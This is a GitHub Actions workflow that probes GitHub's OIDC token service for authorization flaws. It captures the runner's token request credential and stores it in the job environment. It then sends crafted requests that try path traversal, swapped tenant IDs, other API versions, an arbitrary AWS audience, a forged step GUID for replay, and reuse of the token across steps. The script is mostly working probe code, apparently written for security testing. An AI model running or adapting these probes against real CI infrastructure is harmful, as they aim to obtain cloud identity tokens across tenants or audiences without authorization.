name: OIDCProbe
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - name: Capture OIDC token context
        id: capture
        run: |
          echo OIDC_URL=$ACTIONS_ID_TOKEN_REQUEST_URL
          echo OIDC_TOKEN_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}
          echo ORCHESTRATION_ID=$ACTIONS_ORCHESTRATION_ID
          # Save for later steps
          echo "OIDC_URL=$ACTIONS_ID_TOKEN_REQUEST_URL" >> $GITHUB_ENV
          echo "OIDC_REQUEST_TOKEN=$ACTIONS_ID_TOKEN_REQUEST_TOKEN" >> $GITHUB_ENV
      - name: Probe OIDC URL variations
        run: |
          BASE_URL=$OIDC_URL
          BASE_URL_NO_AUD=$(echo $BASE_URL | sed 's/?api-version.*//')
          echo === ORIGINAL URL REQUEST ===
          ORIG=$(curl -sf -H "Authorization: bearer $OIDC_REQUEST_TOKEN" "${BASE_URL}&audience=api.github.com")
          echo $ORIG | python3 -c "import json,sys; d=json.load(sys.stdin); t=d.get('value',''); p=t.split('.')[1] if len(t.split('.'))==3 else ''; import base64; b=p+'='*(-len(p)%4); claims=json.loads(base64.b64decode(b)); print('SUB:', claims.get('sub')); print('REF:', claims.get('ref')); print('JTI:', claims.get('jti'))" 2>/dev/null || echo ORIG_ERR
          echo === DOUBLE SLASH PATH TRAVERSAL ===
          TRAV_URL=$(echo $BASE_URL_NO_AUD | sed 's|/idtoken/|/idtoken/../idtoken/|')
          STATUS=$(curl -sf -o /dev/null -w '%{http_code}' -H "Authorization: bearer $OIDC_REQUEST_TOKEN" "${TRAV_URL}?api-version=2.0&audience=api.github.com" 2>/dev/null || echo CURL_ERR)
          echo TRAVERSAL_STATUS=$STATUS
          echo === DIFFERENT TENANT (191->0) ===
          TENANT0_URL=$(echo $BASE_URL_NO_AUD | sed 's|/191/|/0/|')
          STATUS0=$(curl -sf -o /dev/null -w '%{http_code}' -H "Authorization: bearer $OIDC_REQUEST_TOKEN" "${TENANT0_URL}?api-version=2.0&audience=api.github.com" 2>/dev/null || echo CURL_ERR)
          echo TENANT0_STATUS=$STATUS0
          echo === DIFFERENT TENANT (191->192) ===
          TENANT192_URL=$(echo $BASE_URL_NO_AUD | sed 's|/191/|/192/|')
          STATUS192=$(curl -sf -o /dev/null -w '%{http_code}' -H "Authorization: bearer $OIDC_REQUEST_TOKEN" "${TENANT192_URL}?api-version=2.0&audience=api.github.com" 2>/dev/null || echo CURL_ERR)
          echo TENANT192_STATUS=$STATUS192
          echo === DIFFERENT API VERSION ===
          STATUS_V3=$(curl -sf -o /dev/null -w '%{http_code}' -H "Authorization: bearer $OIDC_REQUEST_TOKEN" "${BASE_URL_NO_AUD}?api-version=3.0&audience=api.github.com" 2>/dev/null || echo CURL_ERR)
          echo API_V3_STATUS=$STATUS_V3
          echo === ARBITRARY AUDIENCE ===
          ARB=$(curl -sf -H "Authorization: bearer $OIDC_REQUEST_TOKEN" "${BASE_URL_NO_AUD}?api-version=2.0&audience=s3.amazonaws.com" 2>/dev/null)
          echo ARB_AUDIENCE_RESPONSE=$(echo $ARB | head -c 200)
          echo === DIFFERENT STEP GUID (replay) ===
          ORIG_GUID=$(echo $BASE_URL_NO_AUD | grep -oP '[0-9a-f-]{36}$')
          FAKE_GUID='00000000-0000-0000-0000-000000000001'
          REPLAY_URL=$(echo $BASE_URL_NO_AUD | sed "s|$ORIG_GUID|$FAKE_GUID|")
          STATUS_REPLAY=$(curl -sf -o /dev/null -w '%{http_code}' -H "Authorization: bearer $OIDC_REQUEST_TOKEN" "${REPLAY_URL}?api-version=2.0&audience=api.github.com" 2>/dev/null || echo CURL_ERR)
          echo REPLAY_STATUS=$STATUS_REPLAY
      - name: Cross-run OIDC token request
        run: |
          echo === USING STEP1 TOKEN IN STEP3 ===
          T=$(curl -sf -H "Authorization: bearer $OIDC_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api.github.com")
          echo CROSS_STEP_TOKEN_LEN=$(echo $T | python3 -c "import json,sys; print(len(json.load(sys.stdin).get('value','')))" 2>/dev/null)
          echo NOTE: OIDC_URL env var is from step1 ACTIONS_ID_TOKEN_REQUEST_URL
          echo CURRENT_STEP_URL=$ACTIONS_ID_TOKEN_REQUEST_URL
          echo SAVED_STEP1_URL=$OIDC_URL
          echo URLs_MATCH=$(test "$ACTIONS_ID_TOKEN_REQUEST_URL" = "$OIDC_URL" && echo YES || echo NO)
